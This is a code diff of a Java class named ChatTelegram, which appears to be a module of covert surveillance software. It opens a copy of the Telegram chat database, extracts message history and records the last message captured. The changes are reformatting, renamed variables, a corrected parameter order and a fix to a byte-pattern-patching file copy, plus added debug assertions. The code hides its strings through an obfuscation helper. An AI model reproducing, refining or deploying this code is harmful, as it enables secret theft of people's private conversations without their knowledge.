@@ -22,11 +22,7 @@ import org.w3c.dom.NodeList;
 import org.xml.sax.SAXException;
 
 import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
 import java.io.IOException;
-import java.io.InputStream;
-import java.io.OutputStream;
 import java.io.RandomAccessFile;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
@@ -118,7 +114,7 @@ public class ChatTelegram extends SubModuleChat {
 			Check.log(TAG + " (updateHistory) " + fast);
 		}
 
-		if (!started|| !readChatSemaphore.tryAcquire()) {
+		if (!started || !readChatSemaphore.tryAcquire()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (updateHistory), semaphore red");
 			}
@@ -157,7 +153,7 @@ public class ChatTelegram extends SubModuleChat {
 				Check.log(TAG + " (updateHistory) Error: " + e);
 			}
 		} finally {
-			if(helper!=null) {
+			if (helper != null) {
 				helper.disposeDb();
 			}
 			readChatSemaphore.release();
@@ -185,7 +181,6 @@ public class ChatTelegram extends SubModuleChat {
 			}
 
 
-
 			GenericSqliteHelper helper = openCopy(dbFile);
 			if (helper == null) {
 				if (Cfg.DEBUG) {
@@ -205,7 +200,7 @@ public class ChatTelegram extends SubModuleChat {
 					markup.serialize(lastmessage);
 					lastTelegram = lastmessage;
 				}
-			}finally {
+			} finally {
 				helper.disposeDb();
 			}
 			started = true;
@@ -220,7 +215,7 @@ public class ChatTelegram extends SubModuleChat {
 
 	}
 
-	public static int truncatedEquals(byte[] buffer, byte[] pattern,int start,int offset) {
+	public static int truncatedEquals(byte[] buffer, int start, byte[] pattern, int offset) {
 
 		int upperBound = Math.min(buffer.length - start, pattern.length - offset);
 		for (int i = 0; i < upperBound; i++) {
@@ -258,36 +253,48 @@ public class ChatTelegram extends SubModuleChat {
 
 
 		try {
-			RandomAccessFile rafs = new RandomAccessFile(fs.getAbsoluteFile(), M.e("r"));
-			RandomAccessFile raf = new RandomAccessFile(local.getAbsoluteFile(), M.e("rw"));
-			int len,prevMatch=0,actualMatch,sizeToMatch=matchString.length();
+			RandomAccessFile source = new RandomAccessFile(fs.getAbsoluteFile(), M.e("r"));
+			RandomAccessFile dest = new RandomAccessFile(local.getAbsoluteFile(), M.e("rw"));
+
+			int len, prevMatch = 0, actualMatch;
+			int sizeToMatch = matchString.length();
 			boolean found = false;
-			long offsetOfNextOffset= rafs.getFilePointer();
-			while (!found && (len = rafs.read(buf)) > 0 ) {
-				for(int i = 0; !found && i< len ; i++){
-					actualMatch=truncatedEquals(buf, match ,i,prevMatch);
-					if(((actualMatch+prevMatch)==sizeToMatch)){
-						offsetOfNextOffset-=prevMatch;
-						raf.seek(offsetOfNextOffset+i);
-						raf.write(replace);
-						rafs.seek(offsetOfNextOffset+i+replace.length);
-						found=true;
+			long offsetOfNextOffset = source.getFilePointer();
+			while (!found && (len = source.read(buf)) > 0) {
+				for (int i = 0; !found && i < len; i++) {
+					actualMatch = truncatedEquals(buf, i, match, prevMatch);
+					if (((actualMatch + prevMatch) == sizeToMatch)) {
+						offsetOfNextOffset -= prevMatch;
+						dest.seek(offsetOfNextOffset + i);
+						dest.write(replace);
+						source.seek(offsetOfNextOffset + i + replace.length);
+						dest.write(buf, i + replace.length, len - (i + replace.length));
+						found = true;
 						break;
 					}
-					if(actualMatch>0){
-						prevMatch=actualMatch;
-						i+=actualMatch;
-					}else{
-						prevMatch=0;
+					if (actualMatch > 0) {
+						prevMatch = actualMatch;
+						i += actualMatch;
+					} else {
+						prevMatch = 0;
 					}
 				}
-				if(!found) {
-					raf.write(buf, 0, len);
+				if (!found) {
+					dest.write(buf, 0, len);
 				}
-				offsetOfNextOffset+=len;
+				offsetOfNextOffset += len;
+				if(Cfg.DEBUG) {
+					Check.asserts(source.getFilePointer() == offsetOfNextOffset, "Pointer does not match");
+				}
 			}
-			rafs.close();
-			raf.close();
+
+			if(Cfg.DEBUG) {
+				Check.asserts(source.length() == dest.length(), "File length do not match");
+				Check.asserts(source.getFilePointer() == dest.getFilePointer(), "File size do not match");
+			}
+
+			source.close();
+			dest.close();
 
 		} catch (IOException e) {
 			if (Cfg.DEBUG) {
